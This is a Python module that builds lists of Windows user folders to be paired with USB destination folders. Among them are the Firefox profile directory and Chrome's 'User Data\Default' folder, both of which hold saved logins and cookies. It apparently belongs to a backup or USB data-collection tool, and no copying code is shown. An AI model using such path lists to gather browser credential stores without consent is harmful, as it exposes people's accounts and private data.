# -*- coding: utf-8 -*-

#---------------------------------------------------------- [Lib] -----------------------------------------------------------#

import os
import glob

#--------------------------------------------------- [Function(s)/Class] ----------------------------------------------------#

class Directories:

    def Search(dirConf, typeOflist, targetMount, usbMount):
        targetDirectoriesList = []
        usbDirectoriesList = []

        for directory in dirConf:

            if directory == "WindowsHome":
            
                if os.path.exists(os.environ["USERPROFILE"]) == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"])
                    usbDirectoriesList.append("WindowsHome")

            elif directory == "Documents":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Documents") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Documents")
                    usbDirectoriesList.append("Documents")

            elif directory == "Downloads":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Downloads") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Downloads")
                    usbDirectoriesList.append("Downloads")

            elif directory == "Pictures":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Pictures") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Pictures")
                    usbDirectoriesList.append("Pictures")

            elif directory == "Desktop":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Desktop") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Desktop")
                    usbDirectoriesList.append("Desktop")

            elif directory == "Dropbox":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Dropbox") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Dropbox")
                    usbDirectoriesList.append("Dropbox")

            elif directory == "OneDrive":
                if os.path.exists(os.environ["USERPROFILE"] + "\\OneDrive") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\OneDrive")
                    usbDirectoriesList.append("OneDrive")

            elif directory == "Contacts":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Contacts") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Contacts")
                    usbDirectoriesList.append("Contacts")

            elif directory == "Outlook":
                if os.path.exists(os.environ["USERPROFILE"] + "\\Outlook") == True:
                    targetDirectoriesList.append(os.environ["USERPROFILE"] + "\\Outlook")
                    usbDirectoriesList.append("Outlook")

            elif directory == "Firefox":
                if os.path.exists(os.environ["APPDATA"] + "\\Mozilla\\Firefox\\Profiles") == True:
                    targetDirectoriesList.append(os.environ["APPDATA"] + "\\Mozilla\\Firefox\\Profiles")
                    usbDirectoriesList.append("Firefox")

            elif directory == "Chrome":
                if os.path.exists(os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default") == True:
                    targetDirectoriesList.append(os.environ["LOCALAPPDATA"] + "\\Google\\Chrome\\User Data\\Default")
                    usbDirectoriesList.append("Chrome")

            elif directory == "OtherPartitions":
                    for mount in targetMount:
                        for usbMountDir in usbMount:
                            
                            if usbMountDir in mount:
                                targetDirectoriesList.append(mount)
                                usbDirectoriesList.append(usbMountDir)
                            else:
                                continue
                        else:
                            continue
            else:
                continue

        if typeOflist == "USB":
            return usbDirectoriesList[:]
        elif typeOflist == "Target":
            return targetDirectoriesList[:]
        else:
            return None


            

        